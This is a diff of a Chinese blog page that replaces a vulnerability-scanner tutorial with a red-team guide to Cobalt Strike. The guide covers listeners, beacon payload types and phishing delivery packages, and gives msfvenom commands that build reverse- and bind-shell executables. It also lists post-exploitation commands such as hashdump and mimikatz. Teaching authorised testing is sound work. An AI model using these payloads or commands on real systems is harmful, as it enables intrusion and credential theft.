@@ -1,177 +1,112 @@
-<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Cobalt Strike 深化：正向/反向 Listener、Staged/Stageless 木马生成、常用插件(CNA/CrossC2)、免杀思路、上线与检测。"><title>漏扫工具全景与 Nuclei 实战</title><link rel=canonical href=https://souljian.cn/p/751088093/><link rel=stylesheet href=/scss/style.min.81579ea678e30582aa60028bfe3192821d6c0fee666ee279be318fb5b558916b.css><meta property='og:title' content="Cobalt Strike 深度实战：木马生成、正反向与插件"><meta property='og:description' content="Cobalt Strike 深化：正向/反向 Listener、Staged/Stageless 木马生成、常用插件(CNA/CrossC2)、免杀思路、上线与检测。"><meta property='og:url' content='https://souljian.cn/p/751088093/'><meta property='og:site_name' content='SoulJian小站'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Nuclei'><meta property='article:tag' content='漏洞扫描'><meta property='article:tag' content='漏扫工具'><meta property='article:tag' content='渗透测试'><meta property='article:tag' content='自动化'><meta property='article:published_time' content='2026-08-29T20:00:00+08:00'><meta property='article:modified_time' content='2026-08-30T10:00:00+08:00'><meta name=twitter:title content="Cobalt Strike 深度实战：木马生成、正反向与插件"><meta name=twitter:description content="Cobalt Strike 深化：正向/反向 Listener、Staged/Stageless 木马生成、常用插件(CNA/CrossC2)、免杀思路、上线与检测。"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Cobalt Strike 深化：正向/反向 Listener、Staged/Stageless 木马生成、常用插件(CNA/CrossC2)、免杀思路、上线与检测。"><title>Cobalt Strike 深度实战：木马生成、正反向与插件</title><link rel=canonical href=https://souljian.cn/p/751088093/><link rel=stylesheet href=/scss/style.min.81579ea678e30582aa60028bfe3192821d6c0fee666ee279be318fb5b558916b.css><meta property='og:title' content="Cobalt Strike 深度实战：木马生成、正反向与插件"><meta property='og:description' content="Cobalt Strike 深化：正向/反向 Listener、Staged/Stageless 木马生成、常用插件(CNA/CrossC2)、免杀思路、上线与检测。"><meta property='og:url' content='https://souljian.cn/p/751088093/'><meta property='og:site_name' content='SoulJian小站'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Cobalt Strike'><meta property='article:tag' content='C2'><meta property='article:tag' content='免杀'><meta property='article:tag' content='后渗透'><meta property='article:tag' content='红队'><meta property='article:published_time' content='2026-08-29T23:40:00+08:00'><meta property='article:modified_time' content='2026-08-29T23:40:00+08:00'><meta name=twitter:title content="Cobalt Strike 深度实战：木马生成、正反向与插件"><meta name=twitter:description content="Cobalt Strike 深化：正向/反向 Listener、Staged/Stageless 木马生成、常用插件(CNA/CrossC2)、免杀思路、上线与检测。"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
 <span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_d0e0f681fd935e1f.jpg width=300 height=303 class=site-logo loading=lazy alt=Avatar>
 </a><span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/>SoulJian小站</a></h1><h2 class=site-description>人生所有的痛苦，皆来自于我执</h2></div></header><ol class=menu-social><li><a href=https://github.com/souljian03 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
 <span>归档</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
 <span>搜索</span></a></li><li><a href=/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
 <span>友情链接</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
 <svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
-<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#写在前面合法学习边界>写在前面：合法学习边界</a></li><li><a href=#一漏扫工具全景对比>一、漏扫工具全景对比</a></li><li><a href=#二漏扫部署拓扑图>二、漏扫部署拓扑图</a></li><li><a href=#三nuclei-实战推荐>三、Nuclei 实战（推荐）</a><ol><li><a href=#安装>安装</a></li><li><a href=#基础使用>基础使用</a></li><li><a href=#模板语法>模板语法</a></li><li><a href=#模板更新>模板更新</a></li></ol></li><li><a href=#四nessus-实战>四、Nessus 实战</a></li><li><a href=#五操作步骤>五、操作步骤</a></li><li><a href=#六检测与防御>六、检测与防御</a></li><li><a href=#七小结>七、小结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%B7%A5%E5%85%B7%E7%B1%BB/ style=background-color:#2a9d8f;color:#fff>工具类</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/751088093/>Cobalt Strike 深度实战：木马生成、正反向与插件</a></h2><h3 class=article-subtitle>Cobalt Strike 深化：正向/反向 Listener、Staged/Stageless 木马生成、常用插件(CNA/CrossC2)、免杀思路、上线与检测。</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#写在前面合法学习边界>写在前面：合法学习边界</a></li><li><a href=#一正反向-listener-与木马>一、正反向 Listener 与木马</a><ol><li><a href=#反向连接reverse最常用>反向连接（Reverse，最常用）</a></li><li><a href=#正向连接bind>正向连接（Bind）</a></li><li><a href=#staged-vs-stageless>Staged vs Stageless</a></li></ol></li><li><a href=#二生成木马>二、生成木马</a><ol><li><a href=#界面生成>界面生成</a></li><li><a href=#msfvenom-配合正反向>msfvenom 配合（正反向）</a></li></ol></li><li><a href=#三上线与后渗透>三、上线与后渗透</a></li><li><a href=#四插件cna--aggressor>四、插件（CNA / Aggressor）</a></li><li><a href=#五免杀思路授权内>五、免杀思路（授权内）</a></li><li><a href=#六检测对立面>六、检测（对立面）</a></li><li><a href=#完整操作步骤>完整操作步骤</a></li><li><a href=#影响与适用>影响与适用</a></li><li><a href=#七小结>七、小结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%B7%A5%E5%85%B7%E7%B1%BB/ style=background-color:#2a9d8f;color:#fff>工具类</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/751088093/>Cobalt Strike 深度实战：木马生成、正反向与插件</a></h2><h3 class=article-subtitle>Cobalt Strike 深化：正向/反向 Listener、Staged/Stageless 木马生成、常用插件(CNA/CrossC2)、免杀思路、上线与检测。</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
 <time class=article-time--published datetime=2026-08-29T23:40:00+08:00>Aug 29, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
-<time class=article-time--reading>阅读时长: 2 分钟</time></div></footer></div></header><section class=article-content><h2 id=写在前面合法学习边界>写在前面：合法学习边界</h2><p>漏洞扫描只用于授权目标。对非授权站点扫描可能违反平台条款与法律。</p><h2 id=一漏扫工具全景对比>一、漏扫工具全景对比</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
-</span><span class=lnt> 2
-</span><span class=lnt> 3
-</span><span class=lnt> 4
-</span><span class=lnt> 5
-</span><span class=lnt> 6
-</span><span class=lnt> 7
-</span><span class=lnt> 8
-</span><span class=lnt> 9
-</span><span class=lnt>10
-</span><span class=lnt>11
-</span><span class=lnt>12
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>┌──────────────┬─────────────────────┬──────────────────────────────┐
-</span></span><span class=line><span class=cl>│   工具       │  类型               │  特点                        │
-</span></span><span class=line><span class=cl>├──────────────┼─────────────────────┼──────────────────────────────┤
-</span></span><span class=line><span class=cl>│ Nuclei       │ 模板驱动            │ 社区模板 10000+，轻量，速度快 │
-</span></span><span class=line><span class=cl>│ Nessus       │ 商业                │ CVE 库全，企业级，报告专业    │
-</span></span><span class=line><span class=cl>│ AWVS         │ 商业                │ Web 专精，误报少              │
-</span></span><span class=line><span class=cl>│ Nikto        │ 开源                │ 简单，Web 漏洞配置错误扫描    │
-</span></span><span class=line><span class=cl>│ OpenVAS      │ 开源                │ 免费，CVE 库丰富，但慢        │
-</span></span><span class=line><span class=cl>│ Arachni      │ 开源                │ Web 爬虫 + 漏洞扫描           │
-</span></span><span class=line><span class=cl>│ WhatWeb      │ 开源                │ 指纹识别，不是漏扫            │
-</span></span><span class=line><span class=cl>│ Dirsearch    │ 开源                │ 目录/文件枚举                 │
-</span></span><span class=line><span class=cl>└──────────────┴─────────────────────┴──────────────────────────────┘
-</span></span></code></pre></td></tr></table></div></div><h2 id=二漏扫部署拓扑图>二、漏扫部署拓扑图</h2><img src=/img/scanner-deploy.svg alt=漏扫工具部署拓扑图><h2 id=三nuclei-实战推荐>三、Nuclei 实战（推荐）</h2><h3 id=安装>安装</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+<time class=article-time--reading>阅读时长: 2 分钟</time></div></footer></div></header><section class=article-content><h2 id=写在前面合法学习边界>写在前面：合法学习边界</h2><p>Cobalt Strike 是商用红队工具，仅用于授权项目。非授权上线可能触犯法律。</p><h2 id=一正反向-listener-与木马>一、正反向 Listener 与木马</h2><img src=/img/c2-arch.svg alt=C2平台通用架构图><h3 id=反向连接reverse最常用>反向连接（Reverse，最常用）</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>原理：目标主动连回攻击机
+</span></span><span class=line><span class=cl>场景：目标可出网
+</span></span><span class=line><span class=cl>Listener：windows/beacon_http_reverse_tcp、reverse_https
+</span></span></code></pre></td></tr></table></div></div><h3 id=正向连接bind>正向连接（Bind）</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>原理：目标开放端口，攻击机连过去
+</span></span><span class=line><span class=cl>场景：目标只能进不能出（防火墙/隔离网）
+</span></span><span class=line><span class=cl>Listener：windows/beacon_bind_tcp
+</span></span></code></pre></td></tr></table></div></div><h3 id=staged-vs-stageless>Staged vs Stageless</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 二进制安装</span>
-</span></span><span class=line><span class=cl>wget https://github.com/projectdiscovery/nuclei/releases/download/v3.x/nuclei_3.x_linux_amd64.zip
-</span></span><span class=line><span class=cl>unzip nuclei_*.zip
-</span></span><span class=line><span class=cl>sudo mv nuclei /usr/local/bin/
-</span></span></code></pre></td></tr></table></div></div><h3 id=基础使用>基础使用</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
-</span><span class=lnt> 2
-</span><span class=lnt> 3
-</span><span class=lnt> 4
-</span><span class=lnt> 5
-</span><span class=lnt> 6
-</span><span class=lnt> 7
-</span><span class=lnt> 8
-</span><span class=lnt> 9
-</span><span class=lnt>10
-</span><span class=lnt>11
-</span><span class=lnt>12
-</span><span class=lnt>13
-</span><span class=lnt>14
-</span><span class=lnt>15
-</span><span class=lnt>16
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 扫描单个 URL</span>
-</span></span><span class=line><span class=cl>nuclei -u https://example.com
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># 批量扫描</span>
-</span></span><span class=line><span class=cl>nuclei -l targets.txt
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># 指定模板</span>
-</span></span><span class=line><span class=cl>nuclei -u https://example.com -t cves/
-</span></span><span class=line><span class=cl>nuclei -u https://example.com -t http/exposures/
-</span></span><span class=line><span class=cl>nuclei -u https://example.com -t http/misconfiguration/
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># 指定严重等级</span>
-</span></span><span class=line><span class=cl>nuclei -u https://example.com -s critical,high
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># 输出 JSON</span>
-</span></span><span class=line><span class=cl>nuclei -u https://example.com -o results.json -json
-</span></span></code></pre></td></tr></table></div></div><h3 id=模板语法>模板语法</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
-</span><span class=lnt> 2
-</span><span class=lnt> 3
-</span><span class=lnt> 4
-</span><span class=lnt> 5
-</span><span class=lnt> 6
-</span><span class=lnt> 7
-</span><span class=lnt> 8
-</span><span class=lnt> 9
-</span><span class=lnt>10
-</span><span class=lnt>11
-</span><span class=lnt>12
-</span><span class=lnt>13
-</span><span class=lnt>14
-</span><span class=lnt>15
-</span><span class=lnt>16
-</span><span class=lnt>17
-</span><span class=lnt>18
-</span><span class=lnt>19
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=c># 自定义 Nuclei 模板示例</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=nt>id</span><span class=p>:</span><span class=w> </span><span class=l>test-vuln</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=nt>info</span><span class=p>:</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>name</span><span class=p>:</span><span class=w> </span><span class=l>测试漏洞模板</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>severity</span><span class=p>:</span><span class=w> </span><span class=l>high</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>author</span><span class=p>:</span><span class=w> </span><span class=l>souljian</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>description</span><span class=p>:</span><span class=w> </span><span class=l>检测某接口是否存在</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=w>
-</span></span></span><span class=line><span class=cl><span class=nt>http</span><span class=p>:</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=w>  </span>- <span class=nt>method</span><span class=p>:</span><span class=w> </span><span class=l>GET</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>path</span><span class=p>:</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=s2>&#34;{{BaseURL}}/admin/config.php&#34;</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>matchers</span><span class=p>:</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=nt>type</span><span class=p>:</span><span class=w> </span><span class=l>status</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nt>status</span><span class=p>:</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=w>          </span>- <span class=m>200</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=nt>type</span><span class=p>:</span><span class=w> </span><span class=l>word</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nt>words</span><span class=p>:</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=w>          </span>- <span class=s2>&#34;debug=true&#34;</span><span class=w>
-</span></span></span></code></pre></td></tr></table></div></div><h3 id=模板更新>模板更新</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Staged：先跑小段加载器，再从服务器拉完整 beacon
+</span></span><span class=line><span class=cl>        体积小、隐蔽性好，但依赖分段下载
+</span></span><span class=line><span class=cl>Stageless：完整 beacon 打进 exe
+</span></span><span class=line><span class=cl>        体积大、更稳，常用于避免分段被拦
+</span></span></code></pre></td></tr></table></div></div><h2 id=二生成木马>二、生成木马</h2><h3 id=界面生成>界面生成</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nuclei -ut        <span class=c1># 更新社区模板</span>
-</span></span><span class=line><span class=cl>nuclei -tl        <span class=c1># 列出所有模板</span>
-</span></span></code></pre></td></tr></table></div></div><h2 id=四nessus-实战>四、Nessus 实战</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Attacks → Packages
+</span></span><span class=line><span class=cl>Windows Executable（Staged/Stageless）
+</span></span><span class=line><span class=cl>Windows Executable(S)：可分片
+</span></span><span class=line><span class=cl>Scripted Web Delivery：远程加载
+</span></span><span class=line><span class=cl>HTML Application / MS Office Macro：钓鱼投递
+</span></span></code></pre></td></tr></table></div></div><h3 id=msfvenom-配合正反向>msfvenom 配合（正反向）</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 反向</span>
+</span></span><span class=line><span class=cl>msfvenom -p windows/meterpreter/reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>攻击机 <span class=nv>LPORT</span><span class=o>=</span><span class=m>4444</span> -f exe -o shell.exe
+</span></span><span class=line><span class=cl><span class=c1># 正向</span>
+</span></span><span class=line><span class=cl>msfvenom -p windows/meterpreter/bind_tcp <span class=nv>RHOST</span><span class=o>=</span>目标 <span class=nv>LPORT</span><span class=o>=</span><span class=m>4444</span> -f exe -o shell.exe
+</span></span></code></pre></td></tr></table></div></div><h2 id=三上线与后渗透>三、上线与后渗透</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>投递木马 → 目标执行 → 会话上线
+</span></span><span class=line><span class=cl>常用命令：shell、upload/download、screenshot、
+</span></span><span class=line><span class=cl>migrate、getsystem、hashdump、mimikatz、socks
+</span></span></code></pre></td></tr></table></div></div><h2 id=四插件cna--aggressor>四、插件（CNA / Aggressor）</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
 </span><span class=lnt>6
 </span><span class=lnt>7
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 安装 Nessus（商业版/教育版）</span>
-</span></span><span class=line><span class=cl>sudo dpkg -i Nessus-10.x.deb
-</span></span><span class=line><span class=cl>sudo /opt/nessus/sbin/nessuscli fix --force
-</span></span><span class=line><span class=cl>sudo systemctl start nessus
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># 访问 https://localhost:8834</span>
-</span></span><span class=line><span class=cl><span class=c1># 配置扫描策略 → 添加目标 → 开始扫描 → 导出报告</span>
-</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span><span class=lnt>4
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>扫描类型：
-</span></span><span class=line><span class=cl>  Basic Auth Scan：基础认证扫描
-</span></span><span class=line><span class=cl>  Web Application Scan：Web 应用扫描
-</span></span><span class=line><span class=cl>  Vulnerability Scan：全漏洞扫描
-</span></span></code></pre></td></tr></table></div></div><h2 id=五操作步骤>五、操作步骤</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span><span class=lnt>4
-</span><span class=lnt>5
-</span><span class=lnt>6
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>第 1 步：确定扫描范围（授权目标）
-</span></span><span class=line><span class=cl>第 2 步：选工具（Nuclei 轻量 / Nessus 全面）
-</span></span><span class=line><span class=cl>第 3 步：配置扫描参数（URL/模板/严重等级）
-</span></span><span class=line><span class=cl>第 4 步：执行扫描
-</span></span><span class=line><span class=cl>第 5 步：分析结果，排除误报
-</span></span><span class=line><span class=cl>第 6 步：输出报告
-</span></span></code></pre></td></tr></table></div></div><h2 id=六检测与防御>六、检测与防御</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Cobalt Strike 用 CNA（Aggressor Script）做扩展
+</span></span><span class=line><span class=cl>常用插件类型：
+</span></span><span class=line><span class=cl>  免杀/加载器
+</span></span><span class=line><span class=cl>  CrossC2：Linux/macOS beacon
+</span></span><span class=line><span class=cl>  各类信息收集/横向辅助
+</span></span><span class=line><span class=cl>  GitHub 上有大量开源插件
+</span></span><span class=line><span class=cl>加载：Script Manager → Load
+</span></span></code></pre></td></tr></table></div></div><h2 id=五免杀思路授权内>五、免杀思路（授权内）</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
 </span><span class=lnt>6
 </span><span class=lnt>7
-</span><span class=lnt>8
-</span><span class=lnt>9
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>检测：
-</span></span><span class=line><span class=cl>• 扫描流量特征：Nuclei/Nessus 的 User-Agent、请求模式
-</span></span><span class=line><span class=cl>• 扫描频率：短时间大量请求到不同 URL
-</span></span><span class=line><span class=cl>• 扫描路径：扫描工具的特征路径（如 /.git/config）
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>防御：
-</span></span><span class=line><span class=cl>• WAF：拦截扫描工具特征
-</span></span><span class=line><span class=cl>• 速率限制：限制单 IP 请求频率
-</span></span><span class=line><span class=cl>• 蜜罐：诱捕扫描者
